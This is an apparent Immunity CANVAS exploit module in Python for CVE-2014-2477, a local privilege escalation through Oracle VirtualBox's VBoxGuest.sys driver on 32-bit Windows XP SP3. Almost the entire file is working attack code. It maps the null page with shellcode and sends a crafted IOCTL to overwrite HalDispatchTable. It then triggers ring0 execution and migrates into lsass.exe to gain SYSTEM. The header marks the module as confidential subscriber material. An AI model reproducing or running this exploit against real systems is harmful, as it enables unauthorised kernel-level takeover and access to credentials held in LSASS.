#! /usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
if "." not in sys.path:
    sys.path.append(".")

import struct
import canvasengine

from exploitutils import *
from canvasexploit import canvasexploit

from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from shelllistener import *


NAME        = 'VBoxGuest.sys Privilege Escalation'
DESCRIPTION = 'Elevate MOSDEF Node privileges through CVE-2014-2477'

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Oracle'
DOCUMENTATION['CVE Name']       = 'CVE-2014-2477'
DOCUMENTATION['CVE Url']        = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2477'
DOCUMENTATION['References']     = 'https://www.korelogic.com/Resources/Advisories/KL-001-2014-001.txt'

VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Local'
PROPERTY['ARCH']                = [['Windows', 'x86']]
PROPERTY['VERSION']             = ['XP SP3']

DOCUMENTATION['Notes'] = """

Exploit has been tested successfully on:
- Windows XP Professional SP3 EN

"""

class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name                   = NAME
        self.device_name            = "\\\\.\\VBoxGuest"
        self.ioctl_code             = 0x22a040

    def get_driver_handle(self):
        GENERIC_READ        = 0x80000000
        GENERIC_WRITE       = 0x40000000
        OPEN_EXISTING       = 0x3

        self.hDriver = self.node.shell.CreateFile(self.device_name, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0)

        if self.hDriver <= 0:
            self.log("[EE] Driver not available (VBoxGuest.sys)")
            return 0
        else:
            self.log("[+] Found VBoxGuest (HANDLE 0x%08x)" % self.hDriver)

        return 1

    def exploit(self):
        ret = self.get_driver_handle()
        if not ret:
            return False

        basename, image_base = self.get_driver_base("ntoskrnl.exe")
        if basename is None:
            return False

        self.log('[+] Found %s at 0x%08x' % (basename, image_base))
        hKernel = self.node.shell.LoadLibraryExW(basename + '\0\0')
        HalDispatchTable = self.node.shell.GetProcAddress(hKernel, 'HalDispatchTable')
        HalDispatchTable = HalDispatchTable - hKernel + image_base
        self.log('[+] HalDispatchTable: 0x%08x' % (HalDispatchTable))

        # allocate null pge
        null_page = self.node.shell.NtAllocateVirtualMemory(0x1, size=0x2000)
        if null_page != 0:
            self.log("[EE] Failed to allocate null page")
            return False

        addr = "\x00\x00\x10\x00"
        shellcode = addr * 140 + '\x90' * (0x1000 - len(addr) * 140) + self.enable_sedebugprivilege_stub_32()

        self.memcpy(0x0, shellcode)
        self.log("[+] Firing IOCTL")
        ret = self.DeviceIoControl(self.hDriver, self.ioctl_code, 0x1, 140, HalDispatchTable - 40 + 4, 0)
        if not ret:
            self.log("[EE] IOCTL unsuccessful")
            self.node.shell.CloseHandle(self.hDriver)
            return False

        self.log("[+] IOCTL sent")
        self.node.shell.CloseHandle(self.hDriver)

        # Trigger ring0 stub execution
        self.node.shell.NtQueryIntervalProfile(2)

        if self.seDebugPrivilege_enabled():
            self.log('[+] ring0 stub executed correctly')
            self.log('[+] Migrating to LSASS')

            migrate = self.engine.getModuleExploit("mosdefmigrate")
            migrate.link(self)
            migrate.argsDict['pid'] = 'lsass.exe'
            ret = migrate.run()

            if not ret:
                self.log("[EE] Failed to migrate to LSASS")
            else:
                # just to be sure
                if self.compromised():
                    self.log("[+] Compromised")
                    return True

        self.log('[EE] Looks like we failed, try again!')
        return False

    def run(self):
        node_success = False
        for node in self.argsDict['passednodes']:
            self.node = node

            #
            # preliminary checks
            #

            # win node
            if not self.is_windows_node():
                self.log('[-] Node %s not a Win32 node' % (self.node.getname()))
                continue

            # 32bit only
            if self.is_64bit_node():
                self.log("[EE] This module runs only on 32bit")
                self.log("[EE] Bailing")
                continue

            # win xp sp3 only
            if not self.is_winxpsp3_node():
                self.log("[EE] This exploit only supports Windows XP SP3 (%s)" % (self.node.getname()))
                continue

            # driver version
            driver_path = "c:\\windows\\system32\\drivers\\vboxguest.sys"
            major, minor, build, revision = self.get_file_version(driver_path)
            vulnerable = True

            if major is None:
                self.log("[-] Failed to get driver version")
            else:
                if major > 4:
                    vulnerable = False

                elif major == 4:
                    if minor == 0 and build >= 26:
                        vulnerable = False

                    if minor == 1 and build >= 34:
                        vulnerable = False

                    if minor == 2 and build >= 26:
                        vulnerable = False

                    if minor == 3 and build >= 12:
                        vulnerable = False

            if not vulnerable:
                self.log("[EE] VBoxGuest additions (%d.%d.%d.%d) are not vulnerable for node (%s)" % (major, minor, build, revision, self.node.getname()))
                continue

            # check if we are already SYSTEM
            if self.compromised():
                self.log("[ii] We have already SYSTEM privileges for this node (%s)" % self.node.getname())
            else:
                node_success = self.exploit()

        return node_success

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
